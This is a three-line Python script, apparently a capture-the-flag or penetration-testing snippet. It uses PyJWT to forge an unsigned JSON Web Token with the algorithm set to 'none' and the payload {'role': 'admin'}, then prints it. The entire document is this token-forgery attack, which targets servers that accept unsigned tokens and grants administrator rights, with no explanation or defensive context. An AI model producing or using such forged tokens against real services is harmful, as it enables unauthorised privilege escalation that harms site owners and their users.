import jwt
encoded = jwt.encode({'role': 'admin'}, '', algorithm='none')
print (encoded)
